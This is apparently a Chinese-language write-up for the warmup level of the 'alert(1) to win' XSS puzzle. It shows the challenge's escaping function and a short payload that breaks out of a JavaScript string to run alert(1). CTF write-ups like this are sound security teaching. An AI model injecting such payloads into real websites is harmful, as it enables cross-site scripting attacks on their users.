## [[alert(1) to win](https://alf.nu/alert1)] [[Level 01 - Warmup](https://alf.nu/alert1)] [[解题报告](https://exp-blog.com/safe/ctf/alert/level-01-warmup/)]

------

## 题目

```javascript
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

------

## 解题报告

水题，闭合函数即可，payload 如下：

```javascript
");alert(1);("
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/alert/Level%2001%20-%20Warmup/imgs/01.png)


------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
